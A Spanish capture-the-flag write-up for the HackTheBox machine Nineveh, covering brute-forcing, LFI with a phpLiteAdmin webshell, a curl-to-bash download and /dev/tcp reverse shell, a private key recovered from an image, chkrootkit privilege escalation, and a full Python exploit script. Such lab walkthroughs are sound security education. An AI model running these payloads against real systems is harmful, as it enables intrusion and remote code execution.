# Nineveh

Buenas, hoy voy a enseñaros a como jikiar la maquina Nineveh, es una maquina linux de dificultad media. 

![images/Untitled.png](images/Untitled.png)

![images/Untitled%201.png](images/Untitled%201.png)

Script en python que automatiza la intrusión a www-data: [https://pastebin.com/A6CEnPBY](https://pastebin.com/A6CEnPBY)

# ENUMERACION

Como siempre realizamos el escaneo de puertos, y nos reporta 2 puertos:

```bash
❯ nmap -sC -sV -p80,443 10.10.10.43 -oN scanPorts
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-09 13:57 EDT
Nmap scan report for 10.10.10.43
Host is up (0.061s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

Hacemos una breve inspeccion antes de entrar en la pagina con whatweb:

```bash
❯ whatweb http://10.10.10.43
http://10.10.10.43 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.43]
                                                                                                                                                                                                                                           
❯ whatweb https://10.10.10.43
https://10.10.10.43 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.43]
```

Despues de ver la pagina no encuentro nada interesante, asi que fuzeo la pagina para encontrar directorios:

```bash
❯ wfuzz -c -w /opt/diccionario_medio.txt -t 200 -L --hc 404 http://nineveh.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://nineveh.htb/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000003007:   200        1 L      3 W        68 Ch       "department"
```

Me reporta el directorio /department en el cual hay un login

```bash
❯ whatweb http://nineveh.htb/department/login.php
http://nineveh.htb/department/login.php [200 OK] Apache[2.4.18], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.43], PasswordField[password], Title[[Nineveh Department]]
```

Tambien fuzeo en la pagina que corre en el puerto 443(https)

```bash
❯ wfuzz -c -w /opt/diccionario_medio.txt -t 200 -L --hc 404 https://nineveh.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nineveh.htb/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000834:   200        485 L    974 W      11430 Ch    "db"
```

Otro panel de inicio de sesion, lo que se me ocurre es probar a hacer fuerza bruta en ambos y esperar:

```bash
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password"
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=admin&password=^PASS^:Invalid Password
[STATUS] 1935.00 tries/min, 1935 tries in 00:01h, 14342464 to do in 123:33h, 16 active
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
```

# EXPLOTACION

Vaya hemos encontrado la contraseña del usuario admin, entramos en la pagina y después de inspeccionar encuentro una dirección un tanto extraña, que muchas veces es señal de posible LFI (Local File Inclusion) "Inclusión de archivos locales de la maquina", consigo explotarlo con la ayuda de BurpSuite, mediante un ataque sniper y con un diccionario de posibles LFIs

![images/Untitled%202.png](images/Untitled%202.png)

![images/Untitled%203.png](images/Untitled%203.png)

Podemos listar el archivo /etc/passwd de la maquina gracias al LFI, tambien podemos ver los puertos abiertos internos de la maquina:

![images/Untitled%204.png](images/Untitled%204.png)

```bash
❯ cat puertos | awk '{print $2}' | grep -v "local" | awk '{print $2}' FS=":" | sort -u
0016
0050
01BB
                                                                                                                                                                                                                                           
❯ python
Python 2.7.18 (default, Jul 14 2021, 08:11:37) 
[GCC 10.2.1 20210110] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x0016
22
>>> 0x0050
80
>>> 0x01BB
443
```

Es interesante que el puerto 22 este abierto internamente, de momento no podemos hacer nada mas con la pagina, asi que pasamos a la siguiente:

![images/Untitled%205.png](images/Untitled%205.png)

Realizo otro ataque de fuerza bruta contra la pagina que corre en el puerto 443:

```bash
❯ hydra 10.10.10.43 -l loquesea -P /usr/share/wordlists/rockyou.txt https-post-form "/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -V -s 443
[443][http-post-form] host: 10.10.10.43   login: loquesea   password: password123
```

Conseguimos la contraseña y en google encuentro una apgina donde nos explica como aprovecharnos de la vulnerabilidad que tiene phpLiteAdmin 1.9

# GANANDO ACCESO

Creamos una nueva base de datos, agregamos una tabla, pegamos el código de una webshell y seleccionamos TEXT, la creamos y en el LFI vamos a la ruta donde se ha guardado:

```bash
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes../../../../../../../var/tmp/hack.php&cmd=curl http://10.10.16.198/shell.sh|bash
```

```bash
❯ cat shell.sh
#!/bin/bash

bash -i > /dev/tcp/10.10.16.198/443 0>&1
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.198] from (UNKNOWN) [10.10.10.43] 59850
whoami
www-data
```

# MOVIMIENTO LATERAL

Tenemos que migrar al usuario amrois, buscamos información acerca de amrois y encontramos un mail de root para amrois, donde dice algo extraño de llamar a la puerta y unos números, con esto se refiere a la técnica de Port Knocking.

```bash
www-data@nineveh:/var/mail$ cat amrois 
From root@nineveh.htb  Fri Jun 23 14:04:19 2017
Return-Path: <root@nineveh.htb>
X-Original-To: amrois
Delivered-To: amrois@nineveh.htb
Received: by nineveh.htb (Postfix, from userid 1000)
        id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
To: amrois@nineveh.htb
From: root@nineveh.htb
Subject: Another Important note!
Message-Id: <20170623190419.D289B2E3587@nineveh.htb>
Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)

Amrois! please knock the door next time! 571 290 911
```

## Que es Port Knocking?

Técnicamente, Port Knocking es un método sigiloso para abrir puertos externamente que, de forma predeterminada, el firewall mantiene cerrados. Funciona al requerir intentos de conexión a una serie de puertos cerrados predefinidos. Cuando se recibe la secuencia correcta de "golpes" de puerto (intentos de conexión), el firewall abre ciertos puertos para permitir una conexión.

```bash
❯ nmap -p571,290,22,911 10.10.10.43                                                                                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 07:02 EDT
Nmap scan report for nineveh.htb (10.10.10.43)                                                                       
Host is up (0.058s latency).                                                                                         
                                                                                                                     
PORT    STATE    SERVICE                                                                                             
22/tcp  open     ssh                                                                                                 
290/tcp filtered unknown                                                                                             
571/tcp filtered umeter                                                                                              
911/tcp filtered xact-backup
```

Ponemos la secuencia correcta en nmap y nos reporta que ahora esta abierto el puerto 22, pero no tenemos ni credenciales ni nada para conectarnos, seguimos enumerando y encontramos que en una imagen han guardado una clave id_rsa, se puede guardar información en los bits de una imagen, de tal forma que la imagen no muestra nada pero en este caso si le hacemos un strings para extraer cadenas de caracteres imprimibles de los archivos, nos compartimos la imagen por netcat y le hacemos un strings:

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ nc 10.10.16.198 443 < nineveh.png
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -nlvp 443 > nineveh.png
```

```bash
❯ strings nineveh.png
<data>
-----BEGIN RSA PRIVATE KEY-----                                                                                                                                                                                                            
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI                                                                                                                                                                           
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU                                                                                                                                                                           
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5                                                                                                                                                                           
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI                                                                                                                                                                           
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT                                                                                                                                                                           
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn                                                                                                                                                                           
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk                                                                                                                                                                           
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z                                                                                                                                                                           
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR                                                                                                                                                                           
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo                                                                                                                                                                           
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu                                                                                                                                                                           
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb                                                                                                                                                                           
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl                                                                                                                                                                           
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b                                                                                                                                                                           
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
<data>
```

vemos una clave id_rsa, ahora que tenemos el puerto 22 abierto vamos a conectarnos mediante ssh aportando la clave, acordaos de dar los permisos necesarios para la clave (chmod 600 id_rsa):

```bash
❯ ssh -i id_rsa amrois@10.10.10.43

amrois@nineveh:~$ cat user.txt 
2f46d57277b815e44-----------
```

# ESCALADA DE PRIVILEGIOS

Ahora toca escalar privilegios, vamos a ver que procesos corren en la maquina con pspy:

```bash
amrois@nineveh:/tmp$ ./pspy64s                                                                                                                                                                                                             
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░
2021/08/10 07:05:03 CMD: UID=0    PID=18935  | /bin/sh /usr/bin/chkrootkit
```

Vemos que corre una tarea cron llamada chkrootkit, buscando que es por google encuentro que tiene una vulnerabilidad bastante grave: [link](https://www.exploit-db.com/exploits/33899)

Seguimos los pasos de la pagina: nos creamos un archivo llamado update en la carpeta /tmp con el payload que queramos y le damos permiso de ejecución (chmod +x update) y la tarea cron ejecutará el update como el usuario root.

```bash
amrois@nineveh:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
amrois@nineveh:~$ cd /tmp
amrois@nineveh:/tmp$ nano update
amrois@nineveh:/tmp$ cat update 
#!/bin/bash

chmod 4755 /bin/bash
amrois@nineveh:/tmp$ chmod +x update 
amrois@nineveh:/tmp$ watch -n 1 ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
amrois@nineveh:/tmp$ bash -p
bash-4.3# cat /root/root.txt
33524d90f416a84698e---------
```

Script que automatiza la intrusion como www-data:

```python
#!/usr/bin/env python3

#Crearos un archivo llamado shell.sh que contenga "#!/bin/bash\n\n bash -i >& /dev/tcp/IP/443 0>&1" y le dais permisos de ejecucion "chmod +x shell.sh"
#Cambiar la IP de variables globales 
#Agregar al /etc/hosts el dominio nineveh.htb

from pwn import *
import sys
import time
import threading
import requests
import urllib3
import subprocess

signal.signal(signal.SIGINT, signal.SIG_DFL)

#Variables globales
IP = "10.10.16.198" # <= cambiar!
url_main = "https://nineveh.htb/db/index.php"
url_create_table = "https://nineveh.htb/db/index.php?action=table_create&confirm=1"
url_LFI = "http://nineveh.htb/department/manage.php?notes=files/ninevehNotes../../../../../../../var/tmp/hack.php&cmd=curl http://%s/shell.sh|bash" %IP
url_login2 = "http://nineveh.htb/department/login.php"
lport = 443

#Funciones
def obtainShell():

    try:
        urllib3.disable_warnings()
        s = requests.Session()
        s.verify = False
        s.keep_alive = False
        login_data = {
            'password' : 'password123',
            'remember' : 'yes',
            'login' : 'Log+In',
            'proc_login' : 'true'
        }
        r = s.post(url_main, data=login_data)
        p1 = log.progress("Iniciando Sesion como Admin:password123")
        cookie_data = {
            'pla3412' : 'password123',
            'pla3412_salt' : '0',
            'PHPSESSID' : '6mg8bpr1556fhre675t44ptsg7'
        }
        create_db_data = {
            'new_dbname'  : 'hack.php'
        }
        p2 = log.progress("\n[*]Se ha agregado una base de datos: hack.php\n")
        r = s.post(url_main, cookies=cookie_data, data=create_db_data)
        create_table_data = {
            'tablename' : 'shell',
            'rows' : '1',
            '0_field' : '<?php system($_REQUEST["cmd"]); ?>',
            '0_type' : 'TEXT',
            '0_defaultvalue' : ''
        }
        r = s.post(url_create_table, cookies=cookie_data, data=create_table_data)
        p3 = log.progress("\nSe ha agregado una nueva tabla a la base de datos con el payload\n")
        time.sleep(1)
        p3.status("\nIniciando sesion como admin:1q2w3e4r5t\n")
        time.sleep(1)
        s = requests.Session()
        login_data2 = {
            'username' : 'admin',
            'password' : '1q2w3e4r5t'
        }
        r = s.post(url_login2, data=login_data2)
        p4 = log.progress("[*]Montando servidor con Python para ejecutar shell.sh")
        subprocess.Popen(["timeout", "5", "python3", "-m", "http.server", "80"])
        time.sleep(2)
        cookie_data2 = {
            'PHPSESSID' : '6mg8bpr1556fhre675t44ptsg7'
        }
        r = s.get(url_LFI, cookies=cookie_data2)
        
    except requests.exceptions.ReadTimeout:
        p3.success("Payload enviado con exito!")
        sys.exit(1)

    except Exception as e:
            print(e)

if __name__ == '__main__':
    try:
        threading.Thread(target=obtainShell).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=10).wait_for_connection()

    if shell.sock is None:
        log.failure("No se ha obtenido conexion")
        sys.exit()
    else:
        log.success("\n ✔️  Se ha obtenido una shell ✔️ \n")
        time.sleep(1)
        log.info("\nAcceso como www-data\n")
        time.sleep(1)

    shell.interactive()
```